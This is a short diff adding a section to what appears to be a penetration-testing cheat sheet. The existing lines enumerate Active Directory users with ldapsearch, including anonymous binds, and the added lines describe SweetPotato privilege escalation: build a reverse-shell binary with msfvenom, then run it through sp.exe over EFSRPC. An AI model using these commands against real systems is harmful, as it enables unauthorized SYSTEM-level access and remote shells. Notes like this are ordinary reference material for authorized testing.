@@ -3505,4 +3505,12 @@ LDAP access
 ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
 ldapsearch -x -H ldap://<IP> -D '' -w '' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
 ```
+
+SweetPotato
+first use msfvenom to generate rev.exe and get it on the machine
+
 ```
+.\sp.exe -e efsrpc -p 'rev.exe'
+```
+
+Other compiled potatos available at SharpCollection
